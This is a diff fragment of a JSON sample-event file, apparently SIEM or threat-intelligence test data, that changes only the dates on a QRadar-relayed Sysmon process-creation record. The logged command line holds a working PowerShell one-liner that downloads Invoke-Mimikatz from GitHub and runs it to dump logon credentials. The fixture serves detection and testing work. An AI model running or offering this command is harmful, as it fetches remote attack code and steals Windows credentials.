                 "log_source_name": "Custom Rule Engine-8 :: qradar",
                 "identity_ip": "0.0.0.0",
-                "utf8_payload": "<182>Oct 10 17:42:57 WinServer AgentDevice=WindowsLog\tAgentLogFile=Microsoft-Windows-Sysmon/Operational\tPluginVersion=7.2.8.145\tSource=Microsoft-Windows-Sysmon\tComputer=WinServer\tOriginatingComputer=WinServer\tUser=SYSTEM\tDomain=NT AUTHORITY\tEventID=1\tEventIDCode=1\tEventType=4\tEventCategory=1\tRecordNumber=94188\tTimeGenerated=1570110670\tTimeWritten=1570110670\tLevel=Informational\tKeywords=0x8000000000000000\tTask=SysmonTask-SYSMON_CREATE_PROCESS\tOpcode=Info\tMessage=Process Create: RuleName:  UtcTime: 2019-10-03 13:51:10.570 ProcessGuid: {1C2D3F54-FCCE-5D95-0000-001078EB0B00} ProcessId: 2252 Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe FileVersion: 10.0.14409.1005 (rs1_srvoob.161208-1155) Description: Windows PowerShell Product: Microsoft\u00ae Windows\u00ae Operating System Company: Microsoft Corporation CommandLine: powershell \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1');Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords exit'\" CurrentDirectory: C:\\Windows\\system32\\ User: WinServer\\admin LogonGuid: {1C2D3F54-F735-5D95-0000-0020946D0400} LogonId: 0x46d94 TerminalSessionId: 1 IntegrityLevel: High Hashes: SHA1=F393D7B531CD44CE418647FE95715ADC3E3C61D2,MD5=EB32C070E658937AA9FA9F3AE629B2B8,SHA256=70BA57FB0BF2F34B86426D21559F5F6D05C1268193904DE8E959D7B06CE964CE,IMPHASH=A4D32F1AEF525B8ADA6A26F28596AC2E ParentProcessGuid: {1C2D3F54-FA72-5D95-0000-0010E2E60900} ParentProcessId: 1668 ParentImage: C:\\Windows\\System32\\cmd.exe ParentCommandLine: \"C:\\Windows\\System32\\cmd.exe\" \n",
+                "utf8_payload": "<182>Oct 10 17:42:57 WinServer AgentDevice=WindowsLog\tAgentLogFile=Microsoft-Windows-Sysmon/Operational\tPluginVersion=7.2.8.145\tSource=Microsoft-Windows-Sysmon\tComputer=WinServer\tOriginatingComputer=WinServer\tUser=SYSTEM\tDomain=NT AUTHORITY\tEventID=1\tEventIDCode=1\tEventType=4\tEventCategory=1\tRecordNumber=94188\tTimeGenerated=1570110670\tTimeWritten=1570110670\tLevel=Informational\tKeywords=0x8000000000000000\tTask=SysmonTask-SYSMON_CREATE_PROCESS\tOpcode=Info\tMessage=Process Create: RuleName:  UtcTime: 2020-01-03 13:51:10.570 ProcessGuid: {1C2D3F54-FCCE-5D95-0000-001078EB0B00} ProcessId: 2252 Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe FileVersion: 10.0.14409.1005 (rs1_srvoob.161208-1155) Description: Windows PowerShell Product: Microsoft\u00ae Windows\u00ae Operating System Company: Microsoft Corporation CommandLine: powershell \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1');Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords exit'\" CurrentDirectory: C:\\Windows\\system32\\ User: WinServer\\admin LogonGuid: {1C2D3F54-F735-5D95-0000-0020946D0400} LogonId: 0x46d94 TerminalSessionId: 1 IntegrityLevel: High Hashes: SHA1=F393D7B531CD44CE418647FE95715ADC3E3C61D2,MD5=EB32C070E658937AA9FA9F3AE629B2B8,SHA256=70BA57FB0BF2F34B86426D21559F5F6D05C1268193904DE8E959D7B06CE964CE,IMPHASH=A4D32F1AEF525B8ADA6A26F28596AC2E ParentProcessGuid: {1C2D3F54-FA72-5D95-0000-0010E2E60900} ParentProcessId: 1668 ParentImage: C:\\Windows\\System32\\cmd.exe ParentCommandLine: \"C:\\Windows\\System32\\cmd.exe\" \n",
                 "magnitude": 5
             },
-            "first_observed": "2019-10-10T16:42:58.140Z",
-            "last_observed": "2019-10-10T16:42:58.140Z",
+            "first_observed": "2020-01-10T16:42:58.140Z",
+            "last_observed": "2020-01-10T16:42:58.140Z",
             "number_observed": 1
         }
     ]
